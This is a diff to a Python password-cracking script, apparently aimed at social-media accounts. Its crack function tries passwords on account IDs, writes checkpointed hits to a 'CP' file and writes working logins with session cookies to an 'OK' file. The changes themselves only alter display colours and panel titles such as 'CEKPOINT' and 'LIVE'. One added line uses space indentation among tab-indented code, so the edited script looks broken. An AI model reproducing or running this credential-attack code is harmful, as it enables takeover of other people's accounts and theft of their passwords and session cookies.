@@ -557,8 +557,9 @@ def crack(idf,pwv):
 					ceker(idf,pw)
 				else:
 					print('\n')
-					statuscp = f'[•]  {idf} |  {pw}'
-					statuscp1 = nel(statuscp, style='red')
+					statuscp = f'[•]  {idf} | {pw}'
+					statuscp1 = nel(statuscp, style='yellow')
+                                        cetak(nel(statuscp1, title='CEKPOINT'))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -571,9 +572,9 @@ def crack(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}'
+					statusok = f'[+] {idf}\n| {pw}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title=' NO SESI'))
+					cetak(nel(statusok1, title=' LIVE'))
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
